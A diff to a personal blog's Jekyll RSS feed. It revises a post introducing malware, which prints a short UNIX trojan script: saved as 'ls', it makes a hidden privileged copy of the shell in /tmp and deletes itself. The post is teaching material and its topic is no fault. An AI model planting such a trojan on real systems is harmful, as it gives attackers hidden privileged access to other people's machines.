@@ -5,19 +5,21 @@
     <description>Personal website, blogs and other updates</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/sitemap.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 13 Jan 2020 09:17:53 +0530</pubDate>
-    <lastBuildDate>Mon, 13 Jan 2020 09:17:53 +0530</lastBuildDate>
+    <pubDate>Mon, 13 Jan 2020 11:02:43 +0530</pubDate>
+    <lastBuildDate>Mon, 13 Jan 2020 11:02:43 +0530</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
         <title>Gentle introduction to Malicious Software or Malware</title>
-        <description>&lt;h3 id=&quot;definition-&quot;&gt;Definition &lt;sup id=&quot;fnref:fn1&quot;&gt;&lt;a href=&quot;#fn:fn1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h3&gt;
+        <description>&lt;h3 id=&quot;definition&quot;&gt;Definition&lt;/h3&gt;
 
-&lt;p&gt;Malicious logic, more commonly called malware, is a set of instructions that cause a site’s security policy to be violated.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Malicious logic, more commonly called malware, is a set of instructions that cause a site’s security policy to be violated.&lt;sup id=&quot;fnref:fn1&quot;&gt;&lt;a href=&quot;#fn:fn1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 
 &lt;p&gt;In earlier days, when UNIX systems were popular, the hackers found a new way to get access to victims machine with a little piece of malicious code like the one below&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /bin/sh &lt;/span&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /bin/sh &lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;# make a privileged, hidden copy of the shell (command interpreter) &lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/sh /tmp/.xxsh 
@@ -29,6 +31,8 @@
 &lt;span class=&quot;c&quot;&gt;# delete this file &lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; ./ls
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When this file is saved with the file name ‘ls’ is victim’s machine,&lt;/p&gt;
 
 &lt;h3 id=&quot;references&quot;&gt;References:&lt;/h3&gt;
 
